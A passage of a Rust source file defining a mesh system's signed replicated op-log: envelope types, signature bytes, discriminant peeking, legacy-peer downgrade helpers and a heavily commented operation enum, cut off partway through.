//! Replicated-state operations (MASTERPLAN §4.4).
//!
//! Mesh state is a signed op-log: per-author append-only sequences, merged
//! deterministically on every node. Every op envelope is signed by its
//! *author node*; since M3, governance bodies additionally embed a signature
//! by the acting *user*, verified at merge time (see `mesh_proto::rbac`).

use serde::{Deserialize, Serialize};

use crate::content::{BundleMeta, ServiceVersion};
use crate::enrol::{EnrolmentDecline, EnrolmentRequest};
use crate::facts::{FactCollector, FactSubject};
use crate::fleet::{ReleaseKey, ReleaseRecord, UpgradePlan};
use crate::ipc::SignedIpc;
use crate::rbac::{AuditEntry, Grant, GrantRevocation, NodeRevocation, UserRecord, UserRevocation};
use crate::secrets::{SecretRecord, SecretRemoval, SecretScope, SecretWrap};
use crate::sessions::SessionPolicy;
use crate::{BundleId, FanId, Hlc, InviteId, JobId, MeshId, NodeId, UpgradeId, UserId};

/// A single replicated operation, *decoded*. `seq` is per-author and
/// gapless, which makes anti-entropy a version-vector range pull.
///
/// This is the shape ops had on the wire and in the store up to protocol
/// 1.6. Since F0 the durable and wire representation is [`OpEnvelope`],
/// whose body is the same postcard bytes left length-delimited; `Op` stays
/// as the V1 wire type (a 1.6 peer still speaks it) and as the convenient
/// decoded form.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Op {
    pub author: NodeId,
    pub seq: u64,
    pub hlc: Hlc,
    pub body: OpBody,
    /// Ed25519 signature (64 bytes) by `author` over [`op_signing_bytes`].
    pub signature: Vec<u8>,
}

/// A replicated operation whose body is **length-delimited** (F0).
///
/// The body is exactly `postcard::to_stdvec(&OpBody)` — the same bytes the
/// signature already covered ([`op_signing_bytes`] ends with them), so
/// every signature ever produced stays valid byte for byte. The point of
/// the shape is that a node can **verify, store and forward an op whose
/// body it cannot decode**: an unknown body is provably authentic, which
/// is what makes carrying it safe. Interpretation is local; convergence is
/// not.
///
/// This mirrors what the IPC envelope has always done —
/// [`crate::SignedIpc::payload`] is an opaque `Vec<u8>` — and closes the
/// one place in the system that signed a positional enum instead.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpEnvelope {
    pub author: NodeId,
    pub seq: u64,
    pub hlc: Hlc,
    /// `postcard(OpBody)`. Opaque to a node that lacks the variant.
    pub body: Vec<u8>,
    /// Ed25519 signature (64 bytes) by `author` over
    /// [`op_signing_bytes_raw`].
    pub signature: Vec<u8>,
}

/// Number of [`OpBody`] variants that protocol **1.6** understands — the
/// last release before the op-log became length-delimited. postcard encodes
/// a variant by index, so an op whose body index is `>=` this cannot be put
/// into a V1 `Vec<Op>` frame at all: a 1.6 peer would fail to decode the
/// *whole* vector and park everything behind it forever (F0 §3.1).
///
/// **Vestigial since protocol 2.0** (2026-09-20). A 1.x peer is refused on
/// the major now, so nothing is ever downgraded to a V1 frame and this
/// bound decides nothing. It is kept because the *encoding* it describes —
/// index 0..27 in 1.6's order — is still what a 1.6 op-log on somebody's
/// disk contains, and a reader written to recover one needs the number.
pub const V1_OPBODY_VARIANTS: u32 = 27;

/// [`OpBody::Checkpoint`]'s postcard discriminant.
///
/// Named so the replay path can ask *"is this a checkpoint?"* with a
/// five-byte varint peek instead of decoding the whole body (**H-4**) —
/// `try_apply` has to answer that question before the gapless test, and
/// decoding twice per op is a cost paid on every op the node has ever seen,
/// every boot.
///
/// Pinned by a test against the enum itself, because a constant that
/// silently stops matching its variant would make checkpoints stop being
/// recognised — and the symptom of that is a node parking forever on a hole
/// the checkpoint exists to explain.
/// **Re-pinned for protocol 2.0**: 61 under 1.x, 38 now. Thirty retired
/// variants ahead of it were deleted, and this is what "every index after
/// the first deletion moves" means in practice — which is why 2.0 is a
/// major bump and not a minor one.
pub const OPBODY_CHECKPOINT_INDEX: u32 = 38;

/// [`OpBody::FactsPublish`]'s postcard discriminant, for the same reason
/// (**H-4**): the fact-history pass walks the whole log and a fact op is a
/// small minority of it, so peeking is most of the saving.
pub const OPBODY_FACTSPUBLISH_INDEX: u32 = 28;

/// [`OpBody::AuditAppend`]'s postcard discriminant (ENG-3): the audit index
/// is rebuilt from the op-log, and audit rows are a minority of it.
pub const OPBODY_AUDITAPPEND_INDEX: u32 = 20;

/// The discriminants of the ops that name a fan-out or gang by id alone —
/// [`OpBody::FanoutAdopt`], [`OpBody::FanoutClosed`], [`OpBody::GangAdopt`]
/// and [`OpBody::GangClosed`] — and so can be left without a plan once the
/// plan is retired (ENG-3). Peeked so the apply path only reconsiders these.
/// Re-pinned for 2.0 with the rest: the fan-out pair sat ahead of every
/// deletion and did not move; the gang pair sat behind them and did.
pub const OPBODY_GROUP_REFERENCE_INDICES: [u32; 4] = [22, 23, 44, 45];

/// The canonical byte string an op signature covers, over an *encoded*
/// body. `body` must be `postcard::to_stdvec(&OpBody)`.
pub fn op_signing_bytes_raw(author: &NodeId, seq: u64, hlc: &Hlc, body: &[u8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(128 + body.len());
    buf.extend_from_slice(b"mw-op-v1");
    buf.extend_from_slice(&author.0);
    buf.extend_from_slice(&seq.to_le_bytes());
    buf.extend_from_slice(&hlc.wall_micros.to_le_bytes());
    buf.extend_from_slice(&hlc.logical.to_le_bytes());
    buf.extend_from_slice(body);
    buf
}

/// The canonical byte string an op signature covers.
pub fn op_signing_bytes(author: &NodeId, seq: u64, hlc: &Hlc, body: &OpBody) -> Vec<u8> {
    // postcard is deterministic for a fixed schema version.
    op_signing_bytes_raw(
        author,
        seq,
        hlc,
        &postcard::to_stdvec(body).unwrap_or_default(),
    )
}

/// Read the leading postcard varint of an encoded [`OpBody`]: its variant
/// index. `None` if the bytes are empty or the varint is malformed.
///
/// postcard encodes an enum discriminant as a LEB128 `u32` at the head of
/// the value, so this needs no schema knowledge — which is the point: a
/// node can classify an op body it has no code for.
pub fn op_body_index(body: &[u8]) -> Option<u32> {
    let mut acc: u32 = 0;
    for (i, byte) in body.iter().take(5).enumerate() {
        acc |= u32::from(byte & 0x7f).checked_shl(7 * i as u32)?;
        if byte & 0x80 == 0 {
            return Some(acc);
        }
    }
    None
}

impl OpEnvelope {
    /// Wrap a decoded op. Infallible in practice — postcard only fails to
    /// encode on a serializer error these types cannot produce — and the
    /// signature is carried through untouched because it already covered
    /// these exact bytes.
    pub fn from_op(op: &Op) -> OpEnvelope {
        OpEnvelope {
            author: op.author,
            seq: op.seq,
            hlc: op.hlc,
            body: postcard::to_stdvec(&op.body).unwrap_or_default(),
            signature: op.signature.clone(),
        }
    }

    /// The bytes this envelope's signature covers.
    pub fn signing_bytes(&self) -> Vec<u8> {
        op_signing_bytes_raw(&self.author, self.seq, &self.hlc, &self.body)
    }

    /// Decode the body, or `None` when this build has no code for it.
    pub fn decode_body(&self) -> Option<OpBody> {
        postcard::from_bytes(&self.body).ok()
    }

    /// This op's `OpBody` variant index, without decoding it.
    pub fn body_index(&self) -> Option<u32> {
        op_body_index(&self.body)
    }

    /// Whether this op can be sent to a pre-1.7 peer inside a V1
    /// `Vec<Op>`. False for any body a 1.6 build has no variant for —
    /// including bodies *this* build cannot decode either, which is the
    /// case that matters once a 1.8 node is in the mesh.
    pub fn v1_sendable(&self) -> bool {
        self.body_index().is_some_and(|i| i < V1_OPBODY_VARIANTS)
    }

    /// Decode into the V1 wire shape. `None` for an unknown body.
    pub fn to_op(&self) -> Option<Op> {
        Some(Op {
            author: self.author,
            seq: self.seq,
            hlc: self.hlc,
            body: self.decode_body()?,
            signature: self.signature.clone(),
        })
    }
}

impl From<&Op> for OpEnvelope {
    fn from(op: &Op) -> Self {
        OpEnvelope::from_op(op)
    }
}

impl From<Op> for OpEnvelope {
    fn from(op: Op) -> Self {
        OpEnvelope::from_op(&op)
    }
}

/// Downgrade a batch for a pre-1.7 peer: drop everything it could not
/// decode, and report the per-author cut point so the caller can truncate
/// the version vector it advertises (F0 §3.3).
///
/// Skipping silently would recreate the permanent gap F0 exists to close,
/// so the caller must pair this with [`truncate_vv`]: the legacy peer is
/// told it is caught up only as far as the last op it can actually be
/// given, believes it, stops retrying, and converges on the subset of
/// state it has code for.
pub fn downgrade_for_v1(envelopes: &[OpEnvelope]) -> (Vec<Op>, Vec<(NodeId, u64)>) {
    // Pass one: per author, the lowest seq the peer cannot be given. Done
    // as its own pass so the result does not depend on batch ordering.
    let mut cut: Vec<(NodeId, u64)> = Vec::new();
    for env in envelopes.iter().filter(|e| !e.v1_sendable()) {
        match cut.iter_mut().find(|(a, _)| *a == env.author) {
            Some((_, seq)) => *seq = (*seq).min(env.seq),
            None => cut.push((env.author, env.seq)),
        }
    }
    // Pass two: everything strictly before its author's cut. seq is
    // gapless, so sending an op past the cut would just park on the far
    // side and never apply.
    let mut out = Vec::with_capacity(envelopes.len());
    for env in envelopes {
        let blocked = cut
            .iter()
            .find(|(a, _)| *a == env.author)
            .is_some_and(|(_, first)| env.seq >= *first);
        if blocked {
            continue;
        }
        if let Some(op) = env.to_op() {
            out.push(op);
        }
    }
    (out, cut)
}

/// Truncate `vv` at the per-author cut points produced by
/// [`downgrade_for_v1`]: for each blocked author, advertise the highest
/// `seq` *strictly before* its first unsendable op.
pub fn truncate_vv(vv: &mut VersionVector, cut: &[(NodeId, u64)]) {
    for (author, first_blocked) in cut {
        if let Some((_, seq)) = vv.iter_mut().find(|(a, _)| a == author) {
            *seq = (*seq).min(first_blocked.saturating_sub(1));
        }
    }
    vv.retain(|(_, seq)| *seq > 0);
}

/// How far a peer's version vector trails ours: total ops it has not seen,
/// and how many authors it is behind on.
///
/// This is the whole of "sync progress" and it costs nothing to compute:
/// every gossip exchange already carries the requester's version vector, so
/// the serving node can say exactly how much of its log that peer is
/// missing without a single extra round trip, extra op, or extra field on
/// the wire.
///
/// Authors present in `theirs` but not in `ours` are ignored rather than
/// counted negative — that is a peer *ahead* of us on some author, which is
/// the normal state of a mesh mid-gossip and not a lag.
pub fn vv_lag(ours: &VersionVector, theirs: &VersionVector) -> (u64, u32) {
    // **Indexed once, not scanned per author** (**M-1**). This was a linear
    // `find` over `theirs` for every entry in `ours` — O(A²), which at a
    // thousand members is a million comparisons *per sync request*, on a
    // path every node walks against every partner every tick.
    //
    // A map rather than assuming both are sorted: `ours` is built from a
    // `BTreeMap` and is, but `theirs` arrived over the wire from a peer and
    // is not something to take on trust.
    let theirs_by_author: std::collections::HashMap<&NodeId, u64> =
        theirs.iter().map(|(a, s)| (a, *s)).collect();
    let mut behind = 0u64;
    let mut authors = 0u32;
    for (author, ours_seq) in ours {
        let theirs_seq = theirs_by_author.get(author).copied().unwrap_or(0);
        let gap = ours_seq.saturating_sub(theirs_seq);
        if gap > 0 {
            behind += gap;
            authors += 1;
        }
    }
    (behind, authors)
}

/// Total ops in a version vector — the denominator "N of M ops" is read
/// against.
pub fn vv_total(vv: &VersionVector) -> u64 {
    vv.iter().map(|(_, seq)| *seq).sum()
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum OpBody {
    /// A node joined the mesh (authored by the accepting node, or by the
    /// founder node for itself at bootstrap).
    MemberAdd {
        member: MemberInfo,
        invite: Option<InviteId>,
    },
    /// A node re-announces mutable attributes (name, addresses, tags,
    /// executor capacity).
    MemberUpdate {
        node_id: NodeId,
        name: String,
        addrs: Vec<String>,
        tags: Vec<String>,
        slots: u32,
    },
    /// Permanent expulsion, authorized by an admin user's signature.
    /// Terminal: a revoked node can never rejoin with the same key.
    /// Enforced at the transport layer.
    MemberRevoke {
        revocation: NodeRevocation,
    },
    /// Graceful departure.
    MemberLeft {
        node_id: NodeId,
    },
    /// Public record of an invite (the token itself never replicates).
    InviteCreate {
        invite: InvitePublic,
    },
    /// An invite use was consumed by `node_id` joining.
    InviteConsume {
        invite_id: InviteId,
        node_id: NodeId,
    },
    /// Revoke an unused/partially-used invite (admin-signed).
    InviteRevoke {
        invite_id: InviteId,
        by: UserId,
        /// Signature by `by` over [`invite_revoke_signing_bytes`].
        signature: Vec<u8>,
    },
    /// Job summary upsert (authored by the executing node). LWW by `hlc`.
    JobUpsert {
        summary: JobSummary,
    },
    /// A bundle now exists in the mesh (metadata only; the manifest and
    /// chunks are fetched on demand from holders).
    BundleAnnounce {
        meta: BundleMeta,
    },
    /// A node holds a complete copy of a bundle (grow-only per bundle).
    BundleHold {
        bundle_id: BundleId,
        node_id: NodeId,
    },
    /// A new immutable service version. LWW-guarded by (name, version).
    ServiceVersionAdd {
        version: ServiceVersion,
    },
    /// Move a service's "latest" pointer (create bumps it; rollback rewinds).
    /// User-signed: rollback changes what runs.
    ServiceHead {
        name: String,
        version: u32,
        by: UserId,
        /// Signature by `by` over [`service_head_signing_bytes`].
        signature: Vec<u8>,
    },
    /// Retire a service entirely (tombstone; hides all versions).
    ServiceRemove {
        name: String,
        by: UserId,
        /// Signature by `by` over [`service_remove_signing_bytes`].
        signature: Vec<u8>,
    },
    // -- M3 governance (MASTERPLAN §7) ------------------------------------
    /// Bind a user key to a username. Authorized by `record.added_by`.
    UserAdd {
        record: UserRecord,
    },
    /// Terminal user revocation.
    UserRevoke {
        revocation: UserRevocation,
    },
    /// A scoped role grant, signed by an admin.
    GrantAdd {
        grant: Grant,
    },
    /// Revoke one grant.
    GrantRevoke {
        revocation: GrantRevocation,
    },
    /// Create or supersede a sealed secret. LWW per name by (version, hlc).
    SecretPut {
        record: SecretRecord,
    },
    /// Tombstone a secret.
    SecretRemove {
        removal: SecretRemoval,
    },
    /// Extend a secret's wraps for nodes that joined after it was sealed.
    /// Node-authored: only a node that is already a wrap target (it can
    /// unwrap the data key) may author this, and only toward active members.
    SecretRewrap {
        name: String,
        version: u32,
        wraps: Vec<SecretWrap>,
    },
    /// Append one audit event (grow-only). Authored by the serving node.
    AuditAppend {
        entry: AuditEntry,
    },
    // -- M5 scheduler & fan-out at depth (MASTERPLAN §9.3, §10.3) ----------
    /// The origin node's replicated record of a fan-out submission, authored
    /// *before* the first sub-job is dispatched. Pre-generated sub-job ids
    /// are the idempotency keys that make adoption at-least-once without
    /// double execution. Author must be `plan.submitter`; first write wins.
    FanoutPlan {
        plan: Box<FanoutPlanRecord>,
    },
    /// A successor claims ownership of a fan-out whose owner died (rendezvous
    /// hashing of the group id over live members picks the successor). Author
    /// must be `by`.
    FanoutAdopt {
        group: FanId,
        by: NodeId,
    },
    /// Terminal record of a fan-out group: every target finished, was halted,
    /// or was given up as unreachable. Author must be the plan's submitter or
    /// a recorded adopter; first write wins.
    FanoutClosed {
        group: FanId,
        succeeded: u32,
        failed: u32,
        skipped: u32,
    },
    // -- M5 Git sources (MASTERPLAN §8.1) -----------------------------------
    /// Register (or replace, LWW by HLC) a Git source. User-signed; the
    /// embedded signature also pre-authorizes automatic service bumps for
    /// the services listed in `source.bump`.
    SourceAdd {
        source: GitSource,
    },
    /// Tombstone a Git source (LWW by HLC — a later SourceAdd re-registers).
    SourceRemove {
        name: String,
        by: UserId,
        /// Signature by `by` over [`source_remove_signing_bytes`].
        signature: Vec<u8>,
    },
    /// Status record from the elected watcher after a successful sync:
    /// the tree at `commit` was ingested as `bundle_id`. Node-authored;
    /// LWW by HLC.
    SourceSynced {
        name: String,
        commit: String,
        bundle_id: BundleId,
    },
    // -- M10 workflows (M10-M13 plan §4) -----------------------------------
    //
    // The first entity kinds appended past [`V1_OPBODY_VARIANTS`], and the
    // reason F0 had to land first: a 1.6 node has no variant for any of
    // these, and before F0 one of them in a sync batch would have wedged
    // that node's sync permanently rather than leaving it merely unable to
    // render workflows.
    //
    // The triple mirrors the service triple above, deliberately: same
    // user-signature-at-merge rules, same immutable-version semantics, same
    // `@latest` / `@3` resolution, same rollback story (§4.2).
    /// A new immutable workflow version. LWW-guarded by (name, version).
    // -- RETIRED 2026-09-12: the workflow engine ---------------------------
    //
    // The workflow, schedule and drafting-agent surfaces were removed. These
    // twelve variants are **kept, with their payload types**, and that is not
    // sentiment — postcard encodes an enum by variant index and every op's
    // signature covers those bytes, so deleting them would renumber all 71
    // variants above index 27 and silently re-read every signed op in every
    // existing data dir and backup as the wrong kind. Exactly the argument
    // `SinkKind::Ndjson` already makes for itself.
    //
    // Nothing produces them. `state.rs` ignores them at merge. They exist so
    // that a log written before the removal still decodes.
    // -- M10 P2 runs (§4.2) -------------------------------------------------
    //
    // The fan-out ownership triple, reused: plan-before-dispatch, adoption
    // by rendezvous-elected successor, terminal close. Compare
    // `FanoutPlan`/`FanoutAdopt`/`FanoutClosed` above — the shapes match
    // because the mechanism is the same one, not a new one.
    // -- RETIRED 2026-09-18: M11 change control ---------------------------
    //
    // Policies and approvals were removed. Indices 35–39 are kept, with
    // their payload types (`crate::policy`), for the reason the workflow
    // block above gives: postcard encodes a variant by its index and every
    // op's signature covers those bytes. Nothing produces them; `state.rs`
    // ignores them at merge.
    // -- RETIRED 2026-09-18: M12 the host inventory ------------------------
    //
    // Indices 40–43, retired in place with their payload types
    // (`crate::hosts`), for the reason the blocks above give. Nothing
    // produces them; `state.rs` ignores them at merge.
    // -- M8 triggers (M8 plan §3.1) ----------------------------------------
    //
    // Two variants, not three. The obvious third — an op per *fire* —
    // was refused: a run's id is derived from `(schedule, occurrence)`
    // and run entries are never removed, so the run entry already **is**
    // the record that the occurrence fired. One op per occurrence,
    // forever, with nothing compacting the op-log, is how a 15-minute
    // schedule authors 35,000 permanent ops a year (§3.11).
    // -- M18 facts (M17-M21 plan §4) ---------------------------------------
    //
    // Indices 46 and 47. **Two, not three**: there is no
    // `FactCollectorRemove`. A collector is *paused* by re-publishing it,
    // exactly as a schedule is, and pausing is inside the signature — so
    // the tombstone body that every other entity here needed is one this
    // one does not, and an index nobody has to spend.
    //
    // The pair splits the way the replicate-or-ask test says it must
    // (§4.3): the collector is slow, small and user-signed, so it is an
    // ordinary governed entity; the *document* is slow, medium and
    // self-described, which is a fourth quadrant M18 opens — an op-log
    // entity with a hard byte cap and a flap guard.
    /// Create or replace a fact collector. User-signed (`rbac::INVENTORY`);
    /// LWW by HLC per `collector.name`, exactly like `SourceAdd`,
    /// `PolicyPut`, `HostPut` and `SchedulePut`.
    FactCollectorPut {
        collector: Box<FactCollector>,
    },
    /// One collector's answer about one subject.
    ///
    /// **Node-authored and unsigned**, like `SecretRewrap` and
    /// `WorkflowLayoutSet`: a machine describing itself is not a governance
    /// act, and requiring a user key would mean a node could not report
    /// what it is without a human present. Authorization is
    /// `MemberUpdate`'s rule — only the subject node may publish about
    /// itself — extended to hosts by M12's vantage-point rule.
    ///
    /// LWW per `(subject, collector)` by HLC. A node authors one of these
    /// **only when `digest` changes**, which is why §4.2's rule about
    /// properties versus measurements is a rule and not a preference.
    FactsPublish {
        subject: FactSubject,
        collector: String,
        /// Canonical JSON, `<= MAX_FACT_DOC`. Over it the publish is
        /// refused on the node that produced it — there is no
        /// spill-to-object path, because a document that does not fit is a
        /// collector bug and giving it somewhere to go would mean the fix
        /// never happens.
        doc: Vec<u8>,
        /// BLAKE3 of `doc`. Carried rather than recomputed so a node can
        /// answer "has this changed?" without decoding the document.
        digest: [u8; 32],
        /// When the collector *observed* this — not when the op was
        /// authored, and not when it arrived.
        collected_at_micros: u64,
    },
    // -- M17 the fabric (§3.4) ----------------------------------------------
    //
    // Appended, like everything since F0. A session policy is the entity
    // that says who may open a terminal where, and it exists rather than a
    // new `Role` variant because appending to `Role` is convergence-safe
    // and *semantics*-unsafe (R7) — a node without the code would carry the
    // op and ignore the role, which for authorization is split-brain.
    //
    // This shape fails the other way. Sessions are refused unless something
    // permits them and a policy only ever *grants*, so a node that cannot
    // decode one grants nothing and refuses. The F0 case that makes a role
    // variant dangerous makes this one safe.
    /// Publish (or replace) a session policy. LWW by HLC on `id`.
    SessionPolicyPut {
        policy: Box<SessionPolicy>,
    },
    /// Retire one. A tombstone rather than a deletion, for the usual
    /// reason: a policy that vanished from one node's state and not
    /// another's is a policy two nodes disagree about.
    SessionPolicyRemove {
        id: String,
        by: UserId,
        /// Signature by `by` over
        /// [`crate::sessions::session_policy_remove_signing_bytes`].
        signature: Vec<u8>,
    },
    // -- M10 P4 workflow drafts ---------------------------------------------
    //
    // Appended, like everything since F0, and safe to append for the same
    // reason `WorkflowLayoutSet` was: a node that cannot decode one simply
    // has no draft for that workflow, which is indistinguishable from
    // nobody having started one. Nothing a draft says can change what runs.
    //
    // **Node-authored and unsigned**, the third member of that set with
    // `SecretRewrap` and `WorkflowLayoutSet`. The justification is the same
    // shape and worth stating plainly: a draft is *not executable*. Only a
    // signed `WorkflowVersionAdd` can ever be dispatched, and publishing
    // one is still a user-signed act gated on a content role. So the worst
    // a dishonest node can do here is put text in somebody's editor — which
    // is exactly the property that made leaving layout unsigned safe, and
    // is why the draft carries *source* rather than a parsed graph.
    // -- M23 enrolment (§3.2) -----------------------------------------------
    //
    // Appended, like everything since F0, and safe to append for the
    // strongest reason in this file: **an enrolment request authorizes
    // nothing.** A node that cannot decode one shows an empty pending
    // queue, which is indistinguishable from nobody having asked, and the
    // act that actually confers power — `UserAdd` + `GrantAdd`, admin
    // signed — is unchanged and as old as M3.
    //
    // This is the shape `SessionPolicyPut` argued for and `Role` could not
    // have: the op only ever *adds a row a human must still act on*, so a
    // node without the code under-shows rather than under-enforces.
    /// A keypair asks to be recognised by this mesh. **Self-signed** by
    /// `request.user_id`, which proves possession of the private half and
    /// is the only thing it proves. Authored by the node the person asked
    /// from, which must be `request.from_node`.
    EnrolRequest {
        request: Box<EnrolmentRequest>,
    },
    /// An admin declined a request. A tombstone, so it stops reappearing
    /// on every node that had already listed it.
    EnrolDecline {
        decline: Box<EnrolmentDecline>,
    },
    // -- M24 fleet upgrade (§4) ---------------------------------------------
    //
    // Appended, like everything since F0, and safe to append for the
    // reason that makes this whole design work: **a plan is inert.**
    //
    // It is a standing authorization — "these nodes *may be asked* to
    // become this version, until then" — and never a trigger. Nothing acts
    // on one until a driver asks a node to, one node at a time, with a
    // human watching. A node that was offline for a rollout and comes back
    // to find a plan in its state does exactly nothing, which is the whole
    // difference between orchestration and auto-update (§5).
    //
    // Replicated rather than carried as a live envelope because a serial
    // rollout across a fleet outlives an IPC envelope's freshness window
    // *and* its replay guard. This is M8's answer for schedules, for the
    // same reason and with the same benefit: authority is re-derived on
    // the acting node from its own state, so revoking the admin stops the
    // rollout everywhere it has not reached, with no signature to recall.
    UpgradePlanPut {
        plan: Box<UpgradePlan>,
    },
    /// Publish a meshnode release **into the mesh** (§9): the binary rides
    /// the content store as a bundle, and this names it, pins its digest
    /// and carries its release-key signature.
    ///
    /// Safe to append for the same reason `UpgradePlanPut` is, and then
    /// some: a release record is *inert*. It is a catalogue entry. Nothing
    /// fetches it, nothing runs it, and a node with no code for the op has
    /// one fewer place to look for a binary — never a binary it did not
    /// expect.
    ReleasePublish {
        release: Box<ReleaseRecord>,
    },
    /// Withdraw a plan. A tombstone, so a cancelled rollout does not come
    /// back on a node that had not yet heard about it.
    UpgradePlanCancel {
        plan_id: UpgradeId,
        by: UserId,
        at_micros: u64,
        /// Signature by `by` over [`crate::upgrade_cancel_signing_bytes`].
        signature: Vec<u8>,
    },
    /// Trust a minisign public key for releases, mesh-wide (§9).
    ///
    /// Inert in the same way a release record is: it authorizes nothing on
    /// its own and triggers nothing. It answers a question a node asks only
    /// when somebody has already driven it to upgrade — *is this binary
    /// signed by a key we trust* — and a build with no code for the op
    /// simply keeps asking its local config, which is what it did before.
    ReleaseKeyPut {
        key: Box<ReleaseKey>,
    },
    /// Withdraw trust in a release key. A tombstone, for the same reason
    /// `UpgradePlanCancel` is one: a revocation that a node has not merged
    /// yet must not be undone by the `Put` arriving afterwards.
    ReleaseKeyRevoke {
        pubkey: String,
        by: UserId,
        at_micros: u64,
        /// Signature by `by` over
        /// [`crate::release_key_revoke_signing_bytes`].
        signature: Vec<u8>,
    },
    // -- M28 the drafting agent (§3) ----------------------------------------
    //
    // Appended, like everything since F0, and safe to append for the
    // strongest version of the reason the release ops were: **this record
    // authorizes nothing that runs.** It names a model and the *name* of a
    // vault entry, and the single thing anyone can do with it is make an
    // outbound call that returns text, which lands in an editor as a draft.
    //
    // A node with no code for the op therefore has no agent — which is
    // exactly the state of every mesh that never configured one, and the
    // state §6 promises anyway: the feature is optional and off, and a mesh
    // without a provider shows no agent UI at all.
    // -- C0 op-log compaction (C0-C9 §4) ------------------------------------
    //
    // Appended, like everything since F0, and the *only* op whose meaning
    // is about the log rather than about the mesh. A checkpoint says one
    // thing: **these sequence numbers of mine are gone on purpose.**
    //
    // It is authored, signed and HLC-stamped like any other op, so a peer
    // with no code for it stores and forwards it unchanged (F0) — the
    // author simply keeps serving the subsumed range to that peer, because
    // an author never prunes bytes it might still owe someone. A peer that
    // *does* understand it skips the range instead of waiting for it
    // forever, which is the entire point: without this op, dropping an op
    // is indistinguishable from losing one, and the gapless per-author rule
    // parks everything behind the hole.
    //
    // Per-author and local: `checkpoint.subsumed` may only name seqs
    // authored by this op's own author, and the merge side enforces it.
    // There is no quorum, no epoch and nothing to agree on.
    Checkpoint {
        checkpoint: Box<Checkpoint>,
    },
    // -- C0 P3 / C1 usage counters (C0-C9 §4.3, §5.2) -----------------------
    //
    // The first entity in meshware whose write rate is proportional to
    // cluster throughput rather than to human action, and the reason C0
    // exists at all. Shaped here rather than in C1 because its *retention*
    // is a compaction question and its *meaning* is a scheduling one, and
    // the retention half has to be right before anything starts writing it.
    //
    // Inert to a node with no code for it, like everything since F0: it is
    // a number nobody has to read.
    UsageAdd {
        usage: Box<UsagePartial>,
    },
    // -- RETIRED 2026-09-18: C1 P3 quotas ---------------------------------
    //
    // Quotas, and the per-node reservation records their ceilings were
    // checked against, were removed. Retired in place with their payload
    // shapes (`crate::quota`); nothing produces them and `state.rs`
    // ignores them. `UsageAdd` above is live: it is what fair share reads.
    // -- C2 deployments (C0-C9 §6) -----------------------------------------
    //
    // Appended, never inserted: `op_body_index` reads the variant from the
    // leading varint and every signature covers the body, so a node on an
    // older minor stores, verifies, counts and forwards a deployment op it
    // has no code for rather than wedging sync (F0, §2.1). That is the
    // whole reason C2 needs no protocol bump.
    /// Create or replace a deployment. User-signed (`rbac::DEPLOYMENTS` —
    /// the roles that may already run a service); LWW by HLC per
    /// `deployment.name`, exactly like `SchedulePut`. A pause, a rollout
    /// and a rollback all travel as one of these, because each is an edit
    /// to what is supposed to stay up and re-signs the record.
    DeploymentPut {
        deployment: Box<crate::deployment::Deployment>,
    },
    /// Tombstone a deployment (LWW by HLC — a later `DeploymentPut`
    /// re-creates it). Instances it started are ordinary jobs and are
    /// cancelled by the reconciler on its next pass, not by this op.
    DeploymentRemove {
        name: String,
        by: UserId,
        /// Signature by `by` over
        /// [`crate::deployment::deployment_remove_signing_bytes`].
        signature: Vec<u8>,
    },
    /// What deployment instances this node currently runs, and their health
    /// (C2 P3).
    ///
    /// Node-authored and unsigned, like `ReservationsPut` and
    /// `SecretRewrap`: it authorizes nothing, and the worst a compromised
    /// node can do is misreport its own instances' health, which costs that
    /// node's own work rather than granting it any. **One record per node,
    /// LWW, republished only on change** — it compacts to exactly one live
    /// op per node and never rides the per-job write path.
    DeploymentHealthPut {
        health: Box<crate::deployment::NodeInstanceHealth>,
    },
    // -- C4 gang scheduling (C0-C9 §8) --------------------------------------
    //
    // The fan-out ownership triple, reused a third time — plan before
    // dispatch, adoption by rendezvous-elected successor, terminal close.
    // Compare `FanoutPlan`/`FanoutAdopt`/`FanoutClosed` and
    // `WorkflowPlan`/`WorkflowAdopt`/`WorkflowClosed`: the shapes match
    // because the mechanism is the same one, not a new one.
    //
    // What is *not* here is the lease. Leases are node-local and
    // TTL-bounded on purpose (§8.2): replicating them would create the one
    // thing this design does not have — a distributed cleanup path for an
    // origin that died holding reservations. The plan is enough, because
    // the question a successor asks is "did this gang ever commit", and the
    // plan plus the members' job summaries answer it.
    /// The origin's replicated record of a gang, authored *before the first
    /// offer*. Pre-generated per-member job ids are the idempotency keys
    /// that make adoption at-least-once without double execution. Author
    /// must be `plan.submitter`; first write wins.
    GangPlan {
        plan: Box<crate::gang::GangPlanRecord>,
    },
    /// A successor claims ownership of a gang whose owner died (rendezvous
    /// hashing of the gang id over live members picks it). Author must be
    /// `by`.
    GangAdopt {
        gang: crate::GangId,
        by: NodeId,
    },
    /// Terminal record of a gang. Author must be the plan's submitter or a
    /// recorded adopter; first write wins.
    ///
    /// `NeverStarted` is its own outcome rather than a kind of failure,
    /// because "nothing ran" is the guarantee the milestone is for and an
    /// operator must be able to read it off the record without inferring it
    /// from an absence of job summaries.
    GangClosed {
        gang: crate::GangId,
        outcome: crate::gang::GangOutcome,
        /// Offer rounds the driver ran. Zero on a gang that committed on
        /// its first attempt, and the number an operator wants when it did
        /// not — it is the difference between "the mesh is full" and "you
        /// are behind three other gangs".
        rounds: u32,
    },
    // -- C5 devices (C0-C9 §9) ---------------------------------------------
    //
    // Appended, riding F0 exactly as the C1, C2 and C4 entities do — which
    // is why the whole of the device *model* costs no protocol minor and
    // only the live telemetry of P5 needs one.
    /// What accelerators this node has, as the node says so (§9.1).
    ///
    /// **Node-authored about itself, and rejected when it is not.** A
    /// device inventory is the same kind of statement as a `cap.*` tag —
    /// true of the machine, known only to the machine — and an operator
    /// elsewhere asserting a GPU onto a box is how work lands where it
    /// cannot run. Unsigned for the reason `ReservationsPut` is: it
    /// authorizes nothing, and the worst a compromised node can do is
    /// misdescribe its own hardware, which costs that node its own work.
    ///
    /// LWW by `published_at_micros`, one live record per node, republished
    /// only on change — so it compacts to exactly one op per node and never
    /// rides a per-job write path.
    DeviceInventoryPut {
        inventory: Box<crate::device::DeviceInventory>,
    },
    // -- clearing job history ----------------------------------------------
    //
    // Appended, riding F0 like every entity since: a node with no code for
    // it stores, verifies and forwards the op rather than wedging sync, and
    // simply keeps showing the history this one has forgotten until it is
    // upgraded. That asymmetry is the honest one — a clear is a request to
    // forget, and a peer that cannot hear it has not lied about anything.
